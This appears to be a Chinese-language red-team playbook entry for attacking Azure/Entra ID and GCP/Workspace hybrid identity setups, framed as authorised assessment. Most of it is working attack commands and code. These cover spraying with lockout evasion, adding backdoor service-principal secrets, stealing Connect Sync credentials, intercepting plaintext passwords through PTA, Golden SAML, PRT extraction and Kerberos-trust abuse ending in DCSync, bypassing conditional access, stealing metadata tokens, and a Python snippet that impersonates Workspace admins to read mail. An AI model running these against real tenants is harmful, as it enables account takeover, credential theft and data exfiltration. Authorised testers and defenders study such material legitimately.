# Azure 与 GCP：身份层攻击与混合穿越（进阶）

> 适用：目标为 Microsoft 365/Azure 或 GCP/Google Workspace 混合身份环境，需要从云身份层打到资源层、再穿越回本地 AD 的授权评估。

## 认什么

**Azure 是三层两套授权**：Entra ID（租户/用户/应用注册/SP）、ARM（订阅/资源组/RBAC）、数据层（Blob/Key Vault/SQL）。两套授权互不覆盖；Global Admin 可 `elevateAccess` 接管全部订阅；能登 M365 ≠ 有订阅权限，须 `az account show` 确认。两条主凭据线：SP 的 `client_id`+secret/证书，与设备上的 PRT。

**混合身份指纹（决定穿越方向）**

| 组件 | 指纹对象 | 方向 | 首枪 |
|---|---|---|---|
| Connect Sync | `MSOL_<id>`、`Sync_*`、`ADSyncMSA*` | AD↔Cloud | `Get-AADIntSyncCredentials` → MSOL 有 DCSync |
| Cloud Sync | `provAgentgMSA` | AD→Cloud | 读 gMSA `msDS-ManagedPassword` → NTLM → DCSync |
| PTA Agent | 直通认证服务器 | Cloud→AD | `Install-AADIntPTASpy` 拦明文密码/放行任意密码 |
| AD FS | 联邦服务器 | AD→Cloud | 导 Token Signing 证书 → Golden SAML |
| Cloud Kerberos Trust | `AzureADKerberos$` | Cloud→AD | 改 `onPremisesSID` → Partial TGT → Full TGT |
| Seamless SSO | `AZUREADSSOACC$` | AD→Cloud | 取哈希 → 银票打 `autologon.microsoftazuread-sso.com` |
| Domain Services / Arc GPO | `AAD DC Administrators` / `AzureArcDeploy` 共享 | Cloud↔AD | 加组即域内 VM 管理员；机器账户解 SP 密钥 |

**GCP 与 AWS 的差异**：层级是 Organization→Folder→Project→Resource；权限绑在资源上（`get-iam-policy`）；PassRole 等价物是 `iam.serviceAccounts.actAs`；Metadata 必须带 `Metadata-Flavor: Google`；**OAuth Scope 限制 Token 能力**——SA 在 IAM 里是 Owner，若 VM Scope 只给 `cloud-platform.read-only`，Token 只能读。GCP 凭据：SA JSON（`type: service_account` + `private_key`）、`ya29.` Access Token、`~/.config/gcloud/` refresh token。

**Workspace 只有一个关键前提**：SA 是否配置 Domain-Wide Delegation（用 SA 的 `oauth2ClientId` 绑定 OAuth Scope）。配了就能冒充域内任意用户（含 Super Admin），且只能人工在 Admin Console 改，API 查不到历史。

## 打哪（命令）

**Azure 无凭据侦察**

```powershell
Invoke-AADIntReconAsOutsider -DomainName target.com | Format-Table
Invoke-AADIntUserEnumerationAsOutsider -UserName "admin@target.com"
Import-Module MicroBurst; Invoke-EnumerateAzureSubDomains -Base targetcorp
```

```bash
curl -s "https://login.microsoftonline.com/target.com/.well-known/openid-configuration" | jq -r '.token_endpoint'
```

喷洒受 Smart Lockout 限制（10 次失败/60 秒）：每用户 1–2 次、间隔 > 60 秒、换出口 IP。另一入口 Device Code：`POST https://login.microsoftonline.com/common/oauth2/devicecode` 取 code，用户登录后换 token。

**Azure 有凭据后的枚举与提权**

```bash
az account show
azurehound list -u user@target.com -p 'password' --tenant target.onmicrosoft.com -o out.json
roadrecon auth -u user@target.com -p 'password'; roadrecon gather
curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/groups?\$filter=displayName eq 'Global Admins'&\$expand=members"
curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?\$filter=consentType eq 'AllPrincipals'"
```

```powershell
# SP 加凭据（需 Application.ReadWrite.All 或应用 Owner；SecretText 只回显一次）
Add-MgApplicationPassword -ApplicationId <app-object-id> -PasswordCredential @{ displayName = "backup" }
Remove-MgApplicationPassword -ApplicationId <app-object-id> -KeyId <key-id>   # 收尾删掉
New-MgGroupMember -GroupId <gid> -DirectoryObjectId <object-id>               # 组注入
```

```bash
# 用新 secret 以 SP 身份登录，验证提权真生效
curl -X POST "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token" \
  -d "client_id={app-id}&client_secret={new-secret}&scope=https://graph.microsoft.com/.default&grant_type=client_credentials"
az role assignment create --assignee <object-id> --role Owner --scope /subscriptions/<sub-id>
curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/beta/roleManagement/directory/roleEligibilityScheduleRequests"
```

**Azure → 本地 AD**

```powershell
Get-AADIntSyncCredentials                     # Connect Sync 存的 MSOL 凭据
Install-AADIntPTASpy; Get-AADIntPTASpyLog -DecodePasswords
Export-AADIntADFSSigningCertificate           # AD FS Token Signing 证书 → Golden SAML
sekurlsa::cloudap                             # PRT + Session Key（无 TPM）
dpapi::cloudapkd /keyvalue:<EncBlob> /unprotect
```

```bash
roadtx prt -a renew --prt <PRT> --prt-sessionkey <clear_key>
seamlesspass -tenant corp.com -adssoacc-ntlm <hash> -user-sid <SID>
python3 modifyuser.py -u <GA_UPN> -p <Password> --sourceanchor <ImmutableID> --sid <Target_SID> --sam <Target_SAM>
roadtx getprt -u <HybridUser> -p <Password> -d <DeviceID>
python3 partialtofulltgt.py -p roadtx.prt -o full_tgt.ccache --extract-hash
secretsdump.py 'DOMAIN/<TargetSAM>$@<DC_IP>' -hashes :<NTLM_hash>
```

条件访问绕过五条：device code、Legacy Authentication、换 client id（非浏览器端）、trusted location、PRT 里的设备声明。已收割 `ESTSAUTH`/`ESTSAUTHPERSISTENT` Cookie 的，导入浏览器即复用"验证已完成"状态；已控主机先捡 `~/.azure/msal_token_cache.json` 与 TokenBroker 缓存。

**GCP metadata / SA / 提权**

```bash
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true"
grep -r "private_key_id" /path/to/code/          # SA Key 泄露；也常驻 ~/.config/gcloud
gcloud auth activate-service-account --key-file=stolen-key.json
gcloud projects get-iam-policy $(gcloud config get-value project) --flatten="bindings[].members" \
  --filter="bindings.members:$(gcloud config get-value account)"
```

提权路径逐条验：`iam.serviceAccountKeys.create` 建钥、`iam.serviceAccounts.getAccessToken` 直取 token、`implicitDelegation` 链式委托、`signBlob`/`signJwt` 签 JWT 冒充、`cloudfunctions.functions.create`、`compute.instances.create`、`run.services.create`、`orgpolicy.policy.set`。数据面：`gsutil ls -r`/`cp -r`、`bq query`/`bq extract`、`gcloud secrets versions access`、`gcloud firestore export`。

**GCP → Workspace（DWD）**

```bash
gcloud iam service-accounts describe <sa-email> --format="value(oauth2ClientId)"
gcloud iam service-accounts keys create ./sa-key.json --iam-account <sa-email>
gcloud auth login --enable-gdrive-access          # 劫持已有 gcloud 会话扩 Scope
```

```python
from google.oauth2 import service_account
import google.auth.transport.requests
creds = service_account.Credentials.from_service_account_file('sa-key.json', scopes=[
    'https://mail.google.com/', 'https://www.googleapis.com/auth/drive',
    'https://www.googleapis.com/auth/admin.directory.user.readonly'])
delegated = creds.with_subject('admin@target-org.com')   # 冒充对象
delegated.refresh(google.auth.transport.requests.Request())
```

拿 token 后打 `gmail.googleapis.com/gmail/v1/users/me/messages`、`www.googleapis.com/drive/v3/files`。不确定 Scope 就逐个试（`mail.google.com`、`drive`、`calendar`、`admin.directory.user/group/domain` 等），DeleFriend 可自动化。

## 什么算成

- Azure：枚举出目录角色持有者，并验证一条可执行提权——`Add-MgApplicationPassword` 后用新 secret 拿到 client_credentials token，或加组后能读该组独有的资源。
- 混合穿越：拿到可复用凭据（MSOL/`AZUREADSSOACC$` 哈希、AD FS 签名私钥、PRT+SessionKey、Full TGT），并完成一次域内动作。
- GCP：SA key 读出 IAM policy 并证明 `roles/owner` 或可 impersonate；DWD 用 `with_subject` 换 token 并调通一个 Workspace API。

## 假点

- 能登 M365 全家桶 ≠ 有 Azure 订阅；`az account show` 为空就只是 M365 身份。
- `Add-MgApplicationPassword` 成功但应用没有目录角色/API 权限，等于空壳 SP，不构成提权；只有 `client_id` 没有 secret/证书也不算有凭据。
- GCP 只有 `storage.objectViewer` 时提权不成立，Scope 只读时也不能写。
- DWD 换到 token 但目标 API 403 → 授权范围没覆盖，不能报"可冒充任意用户"。
- 收尾：password credential 用完删；`Add service principal credentials` 等审计日志清不掉，要写进报告。

## 与其他包联动

- 云端落到本地域：`../../internal-network/knowledge/internal-01-域侦察与决策树.md`；M365/Graph 的 OAuth/JWT：`../../web-auth-access/knowledge/oauth-jwt-test.md`
- 云元数据与凭据链：`cloud-05-云凭据-IAM-元数据.md`；多云判型：`cloud-01-多云资产与攻击面概览.md`；报告口径：`../../../../rules/40-evidence-report.md`
